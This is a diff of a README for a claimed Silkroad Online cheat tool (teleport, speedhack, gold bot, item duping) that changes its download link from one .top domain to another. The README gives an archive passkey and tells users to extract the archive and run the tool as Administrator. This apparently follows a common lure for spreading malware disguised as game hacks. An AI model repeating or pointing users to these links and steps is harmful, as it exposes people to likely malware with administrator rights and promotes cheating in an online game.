@@ -6,7 +6,7 @@ Silkroad Online hack with teleport, speedhack, gold bot, item duping, and charac
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular tools like **SR Bot**, **Silkroad Injector**, and **Silkroad Tr
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Silkroad Online.
 4. Run the hack **as Administrator**.
